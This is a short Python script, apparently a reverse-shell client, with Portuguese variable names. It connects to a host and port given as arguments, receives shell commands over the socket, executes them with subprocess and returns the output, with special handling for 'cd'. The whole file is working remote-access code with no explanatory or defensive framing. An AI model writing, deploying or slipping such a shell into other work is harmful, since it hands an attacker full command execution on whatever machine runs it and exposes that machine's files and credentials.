import socket
# from decouple import config
import sys
import os
import subprocess

# DNS = config('DNS')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexao:
    conexao.connect((sys.argv[1], int(sys.argv[2])))

    print('Conectado\n')

    endereco, porta = conexao.getpeername()

    while True:
        try:
            comando = conexao.recv(1024).decode()

            if comando[:2] == 'cd':
                try:
                    os.chdir(comando[3:])
                    conexao.sendall('continue'.encode())
                    continue
                except FileNotFoundError:
                    os.chdir(repr(comando[3:]))
                    conexao.sendall('continue'.encode())
                    continue

            output = subprocess.getoutput(comando)

            if not output:
                conexao.sendall('continue'.encode())
                continue

            conexao.sendall(output.encode())
        except BrokenPipeError:
            conexao.close()
            break
